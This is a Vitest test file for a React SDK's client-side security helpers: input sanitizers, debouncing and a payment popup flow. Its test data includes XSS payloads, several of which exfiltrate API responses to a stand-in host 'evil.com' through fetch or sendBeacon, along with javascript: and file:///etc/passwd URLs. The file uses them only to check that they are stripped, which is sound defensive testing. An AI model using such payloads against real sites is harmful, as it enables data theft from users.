/**
 * Client-Side Security Tests for Echo React SDK
 *
 * SECURITY TESTING DOCUMENTATION:
 *
 * This test suite validates critical client-side security protections that prevent
 * real-world attacks against the Echo React SDK. Unlike our OAuth/JWT tests which
 * mock server-side behavior, these tests verify actual client-side vulnerabilities.
 *
 * THREAT MODEL:
 * 1. XSS via malicious OAuth provider data
 * 2. CSP policy violations in enterprise environments
 * 3. Client-side API abuse and rate limiting issues
 *
 * WHY THESE TESTS MATTER:
 * - OAuth providers can be compromised, injecting malicious scripts in user profiles
 * - Enterprise deployments require strict CSP compliance
 * - Rapid API calls can trigger rate limits and degrade UX
 *
 * ATTACK SCENARIOS TESTED:
 * - Script injection through user.name, user.email fields
 * - URL injection through profile.picture fields
 * - CSP violations through popup-based payment flows
 * - API spam through rapid function calls
 */

import { describe, test, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  sanitizeText,
  sanitizeUserProfile,
  sanitizeEmail,
  sanitizeUrl,
  debounce,
  openPaymentFlow,
} from '../../utils/security';

describe('Client-Side Security Protection', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // Clear any existing timers
    vi.clearAllTimers();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('XSS Prevention - User Data Sanitization', () => {
    /**
     * SECURITY TEST: Prevents script injection through malicious user profile data
     *
     * ATTACK SCENARIO: Attacker compromises OAuth provider (Auth0, Google, etc.) or
     * performs man-in-the-middle attack to inject malicious JavaScript into user
     * profile fields like name, email, or picture URL.
     *
     * VULNERABILITY: Direct rendering of user.name without sanitization allows
     * script execution: <div>Welcome, {user.name}!</div>
     *
     * PROTECTION: sanitizeText() removes all script tags and dangerous content
     */
    test('prevents script injection through user names', () => {
      const maliciousInputs = [
        // Direct script injection
        '<script>alert("XSS")</script>John Doe',
        // Event handler injection
        "<img src=x onerror=\"fetch('/admin').then(r=>r.json()).then(d=>fetch('https://evil.com', {method:'POST', body:JSON.stringify(d)}))\">John",
        // HTML entity encoding attack
        '&lt;script&gt;alert("XSS")&lt;/script&gt;John',
        // Iframe injection
        '<iframe src="javascript:alert(\'XSS\')"></iframe>John',
        // SVG with script
        '<svg onload="alert(\'XSS\')">John</svg>',
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeText(input);

        // Should remove all script content
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<svg');

        // Should preserve safe text content
        if (input.includes('John')) {
          expect(sanitized).toContain('John');
        }
      });

      // Test JavaScript URL separately since it's not in HTML context
      const jsUrl = 'javascript:alert("XSS")';
      const sanitizedUrl = sanitizeUrl(jsUrl);
      expect(sanitizedUrl).toBe(''); // Should be rejected
    });

    test('prevents email-based injection attacks', () => {
      const maliciousEmails = [
        'user@example.com<script>alert("XSS")</script>',
        'user@example.com"><img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")@example.com',
        'user+<script>alert("XSS")</script>@example.com',
        'user@<script>alert("XSS")</script>.com',
      ];

      maliciousEmails.forEach(email => {
        const sanitized = sanitizeEmail(email);

        // Should either be empty (invalid) or safe
        if (sanitized) {
          expect(sanitized).not.toContain('<script>');
          expect(sanitized).not.toContain('javascript:');
          expect(sanitized).not.toContain('onerror');
          expect(sanitized).toMatch(
            /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/
          );
        }
      });
    });

    test('prevents URL-based injection attacks', () => {
      const maliciousUrls = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:alert("XSS")',
        'file:///etc/passwd',
        'ftp://evil.com/steal',
        'https://evil.com/<script>alert("XSS")</script>',
      ];

      maliciousUrls.forEach(url => {
        const sanitized = sanitizeUrl(url);

        // Should only allow HTTP/HTTPS or be empty
        if (sanitized) {
          expect(sanitized).toMatch(/^https?:\/\//);
          expect(sanitized).not.toContain('<script>');
          expect(sanitized).not.toContain('javascript:');
          expect(sanitized).not.toContain('data:');
          expect(sanitized).not.toContain('vbscript:');
          expect(sanitized).not.toContain('file:');
        }
      });
    });

    test('sanitizes complete user profiles comprehensively', () => {
      // Realistic attack: Compromised OAuth provider returns malicious profile
      const maliciousProfile = {
        name: "<img src=x onerror=\"fetch('/api/admin').then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil.com', JSON.stringify(d)))\">John Hacker",
        email:
          'john@example.com"><script>document.location="https://phishing.com"</script>',
        picture:
          'javascript:fetch("/api/users").then(r=>r.json()).then(d=>fetch("https://evil.com", {method:"POST", body:JSON.stringify(d)}))',
        // Extra fields that might be present
        bio: '<svg onload="alert(\'Profile XSS\')">Friendly developer</svg>',
        website:
          'data:text/html,<script>window.open("https://evil.com")</script>',
      };

      const sanitized = sanitizeUserProfile(maliciousProfile);

      // Should preserve safe content
      expect(sanitized.name).toBe('John Hacker');

      // Email should be sanitized to extract valid portion
      expect(sanitized.email).toBe('john@example.com'); // Should extract valid email portion

      // Should remove all dangerous content
      expect(sanitized.name).not.toContain('<img');
      expect(sanitized.name).not.toContain('onerror');
      expect(sanitized.picture).toBe(''); // javascript: URLs should be rejected

      // All output should be safe for DOM rendering
      expect(sanitized.name).not.toContain('<');
      expect(sanitized.name).not.toContain('>');
    });

    test('handles edge cases safely', () => {
      // Test null/undefined inputs
      expect(sanitizeText(null)).toBe('');
      expect(sanitizeText(undefined)).toBe('');
      expect(sanitizeEmail(null)).toBe('');
      expect(sanitizeUrl(undefined)).toBe('');

      // Test empty strings
      expect(sanitizeText('')).toBe('');
      expect(sanitizeEmail('')).toBe('');
      expect(sanitizeUrl('')).toBe('');

      // Test extremely long inputs (DoS prevention)
      const longInput = 'a'.repeat(2000);
      const sanitized = sanitizeText(longInput);
      expect(sanitized.length).toBeLessThanOrEqual(1000);

      // Test Unicode and special characters
      expect(sanitizeText('José García-López')).toBe('José García-López');
      expect(sanitizeText('用户名')).toBe('用户名');
      expect(sanitizeText('🙂 Happy User')).toBe('🙂 Happy User');
    });
  });

  describe('Rate Limiting - Request Debouncing', () => {
    /**
     * SECURITY TEST: Prevents client-side API abuse through rapid function calls
     *
     * ATTACK SCENARIO: User rapidly clicks refresh button or malicious script
     * makes rapid API calls, triggering server-side rate limiting and degrading
     * user experience for all users.
     *
     * VULNERABILITY: No client-side throttling allows unlimited API calls
     *
     * PROTECTION: debounce() ensures only one call per time period
     */
    test('prevents rapid API calls through debouncing', async () => {
      vi.useFakeTimers();

      const mockApiCall = vi.fn();
      const debouncedCall = debounce(mockApiCall, 1000);

      // Simulate rapid clicking (10 calls in quick succession)
      for (let i = 0; i < 10; i++) {
        debouncedCall(`call-${i}`);
      }

      // Should not have called the function yet
      expect(mockApiCall).not.toHaveBeenCalled();

      // Fast-forward time by 500ms (within debounce period)
      vi.advanceTimersByTime(500);
      expect(mockApiCall).not.toHaveBeenCalled();

      // Fast-forward to complete debounce period
      vi.advanceTimersByTime(500);

      // Should have called only once with the last arguments
      expect(mockApiCall).toHaveBeenCalledTimes(1);
      expect(mockApiCall).toHaveBeenCalledWith('call-9');

      vi.useRealTimers();
    });

    test('allows calls after debounce period expires', async () => {
      vi.useFakeTimers();

      const mockApiCall = vi.fn();
      const debouncedCall = debounce(mockApiCall, 500);

      // First call
      debouncedCall('first');
      vi.advanceTimersByTime(500);
      expect(mockApiCall).toHaveBeenCalledTimes(1);
      expect(mockApiCall).toHaveBeenCalledWith('first');

      // Second call after delay
      debouncedCall('second');
      vi.advanceTimersByTime(500);
      expect(mockApiCall).toHaveBeenCalledTimes(2);
      expect(mockApiCall).toHaveBeenCalledWith('second');

      vi.useRealTimers();
    });

    test('cancels previous calls when new calls are made', async () => {
      vi.useFakeTimers();

      const mockApiCall = vi.fn();
      const debouncedCall = debounce(mockApiCall, 1000);

      // First call
      debouncedCall('first');
      vi.advanceTimersByTime(500); // Half way

      // Second call cancels first
      debouncedCall('second');
      vi.advanceTimersByTime(500); // Should not trigger first call

      expect(mockApiCall).not.toHaveBeenCalled();

      // Complete second call
      vi.advanceTimersByTime(500);
      expect(mockApiCall).toHaveBeenCalledTimes(1);
      expect(mockApiCall).toHaveBeenCalledWith('second');

      vi.useRealTimers();
    });
  });

  describe('CSP Compatibility - Payment Flow Security', () => {
    /**
     * SECURITY TEST: Ensures payment flow works with Content Security Policy
     *
     * ATTACK SCENARIO: Enterprise deployment has strict CSP policy:
     * Content-Security-Policy: script-src 'self'; object-src 'none';
     * This blocks window.open() calls, breaking popup-based payment flows.
     *
     * VULNERABILITY: Direct window.open() usage violates CSP
     *
     * PROTECTION: openPaymentFlow() provides CSP-compatible alternatives
     */
    let mockWindow: {
      open: ReturnType<typeof vi.fn>;
      location: { href: string };
      addEventListener: ReturnType<typeof vi.fn>;
      removeEventListener: ReturnType<typeof vi.fn>;
      confirm: ReturnType<typeof vi.fn>;
    };

    let mockSessionStorage: {
      setItem: ReturnType<typeof vi.fn>;
      getItem: ReturnType<typeof vi.fn>;
      removeItem: ReturnType<typeof vi.fn>;
    };

    beforeEach(() => {
      // Mock window object
      mockWindow = {
        open: vi.fn(),
        location: { href: '' },
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
        confirm: vi.fn(),
      };

      mockSessionStorage = {
        setItem: vi.fn(),
        getItem: vi.fn(),
        removeItem: vi.fn(),
      };

      // Replace global objects
      vi.stubGlobal('window', mockWindow);
      vi.stubGlobal('sessionStorage', mockSessionStorage);
      vi.stubGlobal('confirm', mockWindow.confirm);
    });

    test('attempts popup first, falls back to redirect if blocked', async () => {
      // Mock popup blocked scenario (CSP violation)
      mockWindow.open.mockReturnValue(null);
      mockWindow.confirm.mockReturnValue(true);

      const onComplete = vi.fn();
      const onCancel = vi.fn();

      // Start the payment flow (this will create a promise that resolves later)
      openPaymentFlow('https://stripe.com/payment-link/123', {
        onComplete,
        onCancel,
      });

      // Give it a moment to execute the synchronous parts
      await new Promise(resolve => setTimeout(resolve, 10));

      // Should try popup first
      expect(mockWindow.open).toHaveBeenCalledWith(
        'https://stripe.com/payment-link/123',
        'echo-payment',
        'width=600,height=700,scrollbars=yes,resizable=yes'
      );

      // Should show confirmation for redirect
      expect(mockWindow.confirm).toHaveBeenCalledWith(
        'Payment will open in a new tab. Click OK to continue, or Cancel to abort.'
      );

      // Should set session storage for payment tracking
      expect(mockSessionStorage.setItem).toHaveBeenCalledWith(
        'echo_payment_flow',
        'true'
      );

      // Should redirect to payment URL
      expect(mockWindow.location.href).toBe(
        'https://stripe.com/payment-link/123'
      );

      // Don't await the full promise since it would wait for focus events
    }, 1000);

    test('works with successful popup (non-CSP environment)', async () => {
      // Mock successful popup
      const mockPopup = {
        closed: false,
        close: vi.fn(),
      };

      mockWindow.open.mockReturnValue(mockPopup as Window);

      const onComplete = vi.fn();

      // Start the payment flow
      const paymentPromise = openPaymentFlow(
        'https://stripe.com/payment-link/123',
        {
          onComplete,
        }
      );

      // Simulate popup closing after a short delay (payment complete)
      setTimeout(() => {
        mockPopup.closed = true;
      }, 50);

      await paymentPromise;
      expect(onComplete).toHaveBeenCalled();
    });

    test('rejects dangerous payment URLs', async () => {
      const maliciousUrls = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'file:///etc/passwd',
        'ftp://evil.com/steal',
      ];

      const onError = vi.fn();

      for (const url of maliciousUrls) {
        try {
          await openPaymentFlow(url, { onError });
          expect.fail('Should have thrown for malicious URL');
        } catch (error) {
          expect(error).toBeInstanceOf(Error);
          expect((error as Error).message).toBe('Invalid payment URL provided');
        }
      }
    });

    test('handles user cancellation gracefully', async () => {
      mockWindow.open.mockReturnValue(null);
      mockWindow.confirm.mockReturnValue(false); // User cancels

      const onCancel = vi.fn();

      await openPaymentFlow('https://stripe.com/payment-link/123', {
        onCancel,
      });

      expect(onCancel).toHaveBeenCalled();
      expect(mockWindow.location.href).toBe(''); // No redirect
    });
  });

  describe('Integration - Real-World Attack Simulation', () => {
    /**
     * INTEGRATION TEST: Simulates complete attack scenarios that combine
     * multiple vulnerabilities to demonstrate comprehensive protection.
     */
    test('prevents combined XSS + API abuse attack', async () => {
      vi.useFakeTimers();

      // Simulate attacker injecting malicious profile data AND spamming APIs
      const maliciousProfile = {
        name: '<script>setInterval(() => fetch("/api/balance"), 10)</script>Evil User',
        email: 'evil@example.com"><img src=x onerror="fetch(\'/api/admin\')">',
      };

      // Test profile sanitization
      const sanitized = sanitizeUserProfile(maliciousProfile);
      expect(sanitized.name).toBe('Evil User');
      expect(sanitized.email).toBe('evil@example.com'); // Should extract valid email portion
      expect(sanitized.name).not.toContain('<script>');

      // Test API spam prevention
      const mockApiCall = vi.fn();
      const debouncedRefresh = debounce(mockApiCall, 1000);

      // Simulate rapid refresh attempts (could be from malicious script)
      for (let i = 0; i < 100; i++) {
        debouncedRefresh();
      }

      vi.advanceTimersByTime(1000);

      // Should only call once despite 100 attempts
      expect(mockApiCall).toHaveBeenCalledTimes(1);

      vi.useRealTimers();
    });

    test('handles enterprise security requirements end-to-end', async () => {
      // Simulate enterprise environment with strict security
      const mockCSPViolation = vi.fn();

      // Mock CSP-blocked environment
      const enterpriseWindow = {
        open: vi.fn().mockReturnValue(null), // Blocked by CSP
        confirm: vi.fn().mockReturnValue(true),
        location: { href: '' },
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
      };

      const enterpriseSessionStorage = {
        setItem: vi.fn(),
        getItem: vi.fn(),
        removeItem: vi.fn(),
      };

      vi.stubGlobal('window', enterpriseWindow);
      vi.stubGlobal('sessionStorage', enterpriseSessionStorage);
      vi.stubGlobal('confirm', enterpriseWindow.confirm);

      // Test 1: User profile from compromised OAuth provider
      const suspiciousProfile = {
        name: 'John Doe<iframe src="https://evil.com"></iframe>',
        email: 'john@company.com',
        picture: 'javascript:fetch("/corporate-secrets")',
      };

      const sanitized = sanitizeUserProfile(suspiciousProfile);
      expect(sanitized.name).toBe('John Doe');
      expect(sanitized.picture).toBe(''); // Dangerous URL removed

      // Test 2: CSP-compatible payment flow
      const onComplete = vi.fn();
      openPaymentFlow('https://stripe.com/payment-link/123', { onComplete });

      // Give it a moment to execute synchronous parts
      await new Promise(resolve => setTimeout(resolve, 10));

      // Should handle CSP-blocked popup gracefully
      expect(enterpriseWindow.open).toHaveBeenCalled();
      expect(enterpriseWindow.confirm).toHaveBeenCalled(); // Fallback confirmation
      expect(enterpriseSessionStorage.setItem).toHaveBeenCalled(); // Payment tracking

      // Test 3: No CSP violations occurred
      expect(mockCSPViolation).not.toHaveBeenCalled();
    }, 1000);

    test('maintains security under stress conditions', () => {
      // Test with many concurrent operations
      const results = [];

      for (let i = 0; i < 1000; i++) {
        const maliciousName = `<script>attack${i}</script>User${i}`;
        const sanitized = sanitizeText(maliciousName);
        results.push(sanitized);
      }

      // All results should be safe
      results.forEach((result, index) => {
        expect(result).toBe(`User${index}`);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('attack');
      });

      // Performance should remain reasonable
      const start = Date.now();
      for (let i = 0; i < 1000; i++) {
        sanitizeText('<script>alert("XSS")</script>Test');
      }
      const duration = Date.now() - start;

      // Should complete 1000 sanitizations in reasonable time
      expect(duration).toBeLessThan(1000); // Less than 1 second
    });
  });
});
